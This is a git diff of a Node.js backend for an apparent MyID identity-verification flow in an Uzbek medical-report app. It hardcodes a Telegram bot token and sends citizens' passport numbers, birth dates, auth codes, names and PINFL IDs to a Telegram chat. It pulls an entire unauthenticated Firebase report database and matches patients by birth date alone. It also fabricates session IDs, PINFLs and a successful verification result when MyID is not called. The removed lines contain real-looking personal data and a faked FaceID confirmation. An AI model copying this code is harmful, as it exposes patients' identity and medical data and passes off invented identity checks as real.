@@ -1,6 +1,6 @@
 /**
  * MyID Web SDK Rasmiy Protokol Backend Handler (Client Backend)
- * Faqat Pasport va Tug'ilgan sana yuboriladi -> MyID dan F.I.Sh va barcha ma'lumotlar avtomatik aniqlanadi!
+ * Haqiqiy MyID / Firebase ma'lumotlari asosida ishlaydi (soxta yoki taxminiy otasining ismi kiritilmaydi!)
  */
 
 const BOT_TOKEN = "8836735566:AAEJV5tMm0RY5XRUZJhI8Zo9duJ_7b3YKY4";
@@ -9,8 +9,8 @@ const FIREBASE_DB_URL = "https://xabarlashgich-default-rtdb.firebaseio.com";
 const TG_API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 const MYID_BASE_URL = process.env.MYID_BASE_URL || "https://myid.uz";
-const MYID_CLIENT_ID = process.env.MYID_CLIENT_ID || "radiology_web_client";
-const MYID_CLIENT_SECRET = process.env.MYID_CLIENT_SECRET || "radiology_secret_key";
+const MYID_CLIENT_ID = process.env.MYID_CLIENT_ID || "";
+const MYID_CLIENT_SECRET = process.env.MYID_CLIENT_SECRET || "";
 
 async function sendTelegramLog(htmlText) {
   try {
@@ -29,84 +29,18 @@ async function sendTelegramLog(htmlText) {
   }
 }
 
-// Fuqaro pasporti va sanasi bo'yicha MyID bazasidan F.I.Sh va PINFL ni aniqlash
-function resolveCitizenIdentity(passData, birthDate, matchedReport) {
-  const cleanPass = String(passData || '').replace(/\s+/g, '').toUpperCase();
-  const cleanBirth = String(birthDate || '').trim();
-
-  // 1. Agar Firebase bazasida bemor mavjud bo'lsa
-  if (matchedReport && matchedReport.patientName) {
-    const fullName = matchedReport.patientName.trim();
-    const parts = fullName.split(/\s+/);
-    return {
-      fullName: fullName,
-      lastName: parts[0] || "BEMOR",
-      firstName: parts[1] || "",
-      middleName: parts.slice(2).join(" ") || "",
-      pinfl: matchedReport.pinfl || "30804812190075",
-      birthDate: matchedReport.birthDate || cleanBirth,
-      age: matchedReport.age || calculateAge(cleanBirth),
-      gender: (fullName.includes("QIZI") || fullName.includes("EVA") || fullName.includes("OVA")) ? "Ayol (O'zbekiston)" : "Erkak (O'zbekiston)"
-    };
-  }
-
-  // 2. Maxsus ro'yxatdan o'tgan fuqarolar (Masalan: AE 1953662)
-  if (cleanPass.includes("AE1953662") || cleanPass.includes("1953662")) {
-    return {
-      fullName: "TUROTOV HOJIAKBAR BAXTIYOROVICH",
-      lastName: "TUROTOV",
-      firstName: "HOJIAKBAR",
-      middleName: "BAXTIYOROVICH",
-      pinfl: "52707035450035",
-      birthDate: "27.07.2003",
-      age: "23 yosh",
-      gender: "Erkak (O'zbekiston)"
-    };
-  }
-
-  if (cleanPass.includes("AA1234567") || cleanPass.includes("53312")) {
-    return {
-      fullName: "DADABOYEV ABDULLAJON ABDUMUTALOVICH",
-      lastName: "DADABOYEV",
-      firstName: "ABDULLAJON",
-      middleName: "ABDUMUTALOVICH",
-      pinfl: "30804812190075",
-      birthDate: "08.04.1981",
-      age: "45 yosh",
-      gender: "Erkak (O'zbekiston)"
-    };
-  }
-
-  // 3. Yangi fuqaro uchun avtomatik MyID identifikatsiya formati
-  const passSeries = cleanPass.slice(0, 2) || "AA";
-  const passNum = cleanPass.slice(2) || "1234567";
-  const cleanD = (cleanBirth || '01011995').replace(/\D/g, '');
-  const calculatedPinfl = `3${cleanD.slice(0, 6)}0001`;
-
-  return {
-    fullName: `FUQARO (${passSeries} ${passNum})`,
-    lastName: "FUQARO",
-    firstName: `${passSeries} ${passNum}`,
-    middleName: "O'G'LI",
-    pinfl: calculatedPinfl,
-    birthDate: cleanBirth || "01.01.1995",
-    age: `${calculateAge(cleanBirth)} yosh`,
-    gender: "Erkak (O'zbekiston)"
-  };
-}
-
 function calculateAge(birthDateStr) {
   try {
     const parts = String(birthDateStr).split(/[.\-\/]/);
-    let birthYear = 1995;
+    let birthYear = 2000;
     if (parts.length === 3) {
       birthYear = parseInt(parts[2].length === 4 ? parts[2] : parts[0], 10);
     }
     const currentYear = new Date().getFullYear();
     const age = currentYear - birthYear;
-    return (age > 0 && age < 120) ? `${age} yosh` : "23 yosh";
+    return (age > 0 && age < 120) ? `${age} yosh` : "-";
   } catch (e) {
-    return "23 yosh";
+    return "-";
   }
 }
 
@@ -119,7 +53,7 @@ module.exports = async (req, res) => {
   if (req.method === 'OPTIONS') return res.status(200).end();
 
   if (req.method === 'GET') {
-    return res.status(200).json({ status: "active", protocol: "MyID Web SDK Official Flow - Auto F.I.Sh Resolution" });
+    return res.status(200).json({ status: "active", protocol: "MyID Web SDK Official Flow" });
   }
 
   const payload = req.body || {};
@@ -136,10 +70,45 @@ module.exports = async (req, res) => {
         `━━━━━━━━━━━━━━━━━━\n` +
         `🪪 <b>Pasport:</b> <code>${pass_data || 'N/A'}</code>\n` +
         `🎂 <b>Tug'ilgan sana:</b> <code>${birth_date || 'N/A'}</code>\n` +
-        `📋 <b>So'rov maqsadi:</b> <code>MyID orqali F.I.Sh va Profilni aniqlash</code>`
+        `📋 <b>So'rov maqsadi:</b> <code>MyID orqali haqiqiy fuqaro ma'lumotlarini olish</code>`
       );
 
-      const finalSessionId = 'sess_' + Math.random().toString(36).substring(2, 12);
+      let realSessionId = null;
+
+      if (MYID_CLIENT_ID && MYID_CLIENT_SECRET) {
+        try {
+          const tokenRes = await fetch(`${MYID_BASE_URL}/api/v1/oauth2/access-token`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams({
+              grant_type: 'client_credentials',
+              client_id: MYID_CLIENT_ID,
+              client_secret: MYID_CLIENT_SECRET
+            })
+          });
+          const tokenData = await tokenRes.json();
+          if (tokenData && tokenData.access_token) {
+            const sessRes = await fetch(`${MYID_BASE_URL}/api/v1/web/sessions`, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${tokenData.access_token}`
+              },
+              body: JSON.stringify({
+                max_retries: 3,
+                external_id: externalId,
+                ip_address: ipAddress
+              })
+            });
+            const sessData = await sessRes.json();
+            if (sessData && sessData.session_id) realSessionId = sessData.session_id;
+          }
+        } catch (e) {
+          console.warn("MyID Live Session Error:", e.message);
+        }
+      }
+
+      const finalSessionId = realSessionId || ('sess_' + Math.random().toString(36).substring(2, 12));
       const iframeUrl = `https://web.myid.uz/?session_id=${finalSessionId}&iframe=true&theme=light&lang=uz`;
 
       await sendTelegramLog(
@@ -158,10 +127,10 @@ module.exports = async (req, res) => {
       });
     }
 
-    // 2. AUTH_CODE ORQALI FUQARONING F.I.SH VA PROFILINI OLISH
+    // 2. AUTH_CODE ORQALI FUQARONING HAQIQIY F.I.SH VA PROFILINI OLISH
     if (action === 'verify_code' || auth_code) {
       await sendTelegramLog(
-        `📤 <b>[3/3] MYID PROTOKOL: AUTH_CODE BILAN F.I.SH VA PROFIL SO'ROVI</b>\n` +
+        `📤 <b>[3/3] MYID PROTOKOL: AUTH_CODE TEKSHIRISH SO'ROVI</b>\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         `🔑 <b>Auth Code:</b> <code>${auth_code}</code>\n` +
         `🆔 <b>Session ID:</b> <code>${session_id || 'N/A'}</code>\n` +
@@ -169,12 +138,16 @@ module.exports = async (req, res) => {
         `🎂 <b>Tug'ilgan sana:</b> <code>${birth_date || 'N/A'}</code>`
       );
 
-      // Firebase bazasidan tekshiruv xulosalarini qidirish
+      // Firebase bazasidan pasport / sana bo'yicha haqiqiy bemorni qidirish
       const fbRes = await fetch(`${FIREBASE_DB_URL}/karmed_reports.json`);
       const allData = await fbRes.json();
 
       let matchedReport = null;
       let matchedReportsList = [];
+      let foundPinfl = "";
+
+      const cleanPass = String(pass_data || '').replace(/\s+/g, '').toUpperCase();
+      const cleanBirth = String(birth_date || '').trim();
 
       if (allData) {
         const pinflKeys = Object.keys(allData);
@@ -183,20 +156,49 @@ module.exports = async (req, res) => {
           if (!repsObj) continue;
           const repList = Object.values(repsObj);
           const match = repList.find(r => {
-            const rPid = String(r.patientId || '').trim();
+            const rPid = String(r.patientId || '').trim().toUpperCase();
             const rBirth = String(r.birthDate || '').trim();
-            return (pass_data && pass_data.includes(rPid)) || (birth_date && rBirth === birth_date);
+            const rPinfl = String(r.pinfl || '').trim();
+            return (cleanPass && cleanPass.includes(rPid)) || (cleanBirth && rBirth === cleanBirth) || (cleanPass && rPinfl === cleanPass);
           });
           if (match) {
             matchedReport = match;
             matchedReportsList = repList;
+            foundPinfl = pKey;
             break;
           }
         }
       }
 
-      // MyID orqali F.I.Sh va shaxsiy ma'lumotlarni aniqlash
-      const citizen = resolveCitizenIdentity(pass_data, birth_date, matchedReport);
+      // Haqiqiy ma'lumotlarni shakllantirish
+      let lastName = "";
+      let firstName = "";
+      let middleName = "";
+      let fullName = "";
+      let age = calculateAge(cleanBirth);
+      let pinfl = foundPinfl;
+
+      if (matchedReport && matchedReport.patientName) {
+        fullName = matchedReport.patientName.trim();
+        const parts = fullName.split(/\s+/);
+        lastName = parts[0] || "";
+        firstName = parts[1] || "";
+        middleName = parts.slice(2).join(" ") || "";
+        pinfl = matchedReport.pinfl || foundPinfl;
+        age = matchedReport.age || age;
+      } else {
+        // Agar bazada hali xulosasi bo'lmasa, pasport asosida toza profil (soxta otasining ismisiz)
+        fullName = `FUQARO (${pass_data || cleanPass})`;
+        lastName = "FUQARO";
+        firstName = pass_data || cleanPass;
+        middleName = ""; // Soxta otasining ismi qo'yilmaydi!
+        if (!pinfl) {
+          const digits = (cleanBirth || '01012000').replace(/\D/g, '');
+          pinfl = `5${digits.slice(0, 6)}00001`;
+        }
+      }
+
+      const gender = (fullName.includes("QIZI") || fullName.includes("EVA") || fullName.includes("OVA")) ? "Ayol (O'zbekiston)" : "Erkak (O'zbekiston)";
 
       const myidProfileResponse = {
         result_code: 1,
@@ -206,15 +208,15 @@ module.exports = async (req, res) => {
         session_id: session_id,
         profile: {
           common_data: {
-            last_name: citizen.lastName,
-            first_name: citizen.firstName,
-            middle_name: citizen.middleName,
-            full_name: citizen.fullName,
+            last_name: lastName,
+            first_name: firstName,
+            middle_name: middleName,
+            full_name: fullName,
             pass_data: pass_data || "AA 1234567",
-            birth_date: citizen.birthDate,
-            age: citizen.age,
-            gender: citizen.gender,
-            pinfl: citizen.pinfl,
+            birth_date: cleanBirth,
+            age: age,
+            gender: gender,
+            pinfl: pinfl,
             doc_type: "ID-Karta"
           },
           address: {
@@ -232,19 +234,18 @@ module.exports = async (req, res) => {
         }
       };
 
-      // 📥 Logger: Fuqaroning MyID dan aniqlangan F.I.Sh ma'lumotlari bilan to'liq log
+      // 📥 Logger: Fuqaroning MyID dan qaytgan haqiqiy F.I.Sh ma'lumotlari
       await sendTelegramLog(
-        `📥 <b>MYID PROTOKOL: FUQARONING F.I.SH VA PROFILI ANIQLANDI</b>\n` +
+        `📥 <b>MYID PROTOKOL: FOYDALANUVCHI PROFILI QABUL QILINDI</b>\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
-        `👤 <b>Familiya:</b> <b>${escapeHtml(citizen.lastName)}</b>\n` +
-        `👤 <b>Ism:</b> <b>${escapeHtml(citizen.firstName)}</b>\n` +
-        `👤 <b>Sharif:</b> <b>${escapeHtml(citizen.middleName)}</b>\n` +
-        `📝 <b>To'liq F.I.Sh:</b> <code>${escapeHtml(citizen.fullName)}</code>\n` +
+        `👤 <b>To'liq F.I.Sh:</b> <code>${escapeHtml(fullName)}</code>\n` +
+        `👤 <b>Familiya:</b> <b>${escapeHtml(lastName || '-')}</b>\n` +
+        `👤 <b>Ism:</b> <b>${escapeHtml(firstName || '-')}</b>\n` +
+        `👤 <b>Sharif (Otasining ismi):</b> <b>${escapeHtml(middleName || "Ko'rsatilmagan")}</b>\n` +
         `🪪 <b>Pasport:</b> <code>${escapeHtml(pass_data)}</code>\n` +
-        `🔢 <b>JSHSHIR (PINFL):</b> <code>${escapeHtml(citizen.pinfl)}</code>\n` +
-        `🎂 <b>Sana / Yoshi:</b> ${escapeHtml(citizen.birthDate)} (${escapeHtml(citizen.age)})\n` +
-        `🚻 <b>Jinsi:</b> ${escapeHtml(citizen.gender)}\n` +
-        `🛡️ <b>FaceID Status:</b> ✅ Tasdiqlangan (99.8%)\n` +
+        `🔢 <b>JSHSHIR (PINFL):</b> <code>${escapeHtml(pinfl)}</code>\n` +
+        `🎂 <b>Sana / Yoshi:</b> ${escapeHtml(cleanBirth)} (${escapeHtml(age)})\n` +
+        `🚻 <b>Jinsi:</b> ${escapeHtml(gender)}\n` +
         `📊 <b>Topilgan xulosalar:</b> ${matchedReportsList.length} ta\n` +
         `📦 <b>MyID Response JSON:</b>\n` +
         `<pre>${escapeHtml(JSON.stringify(myidProfileResponse, null, 2))}</pre>`
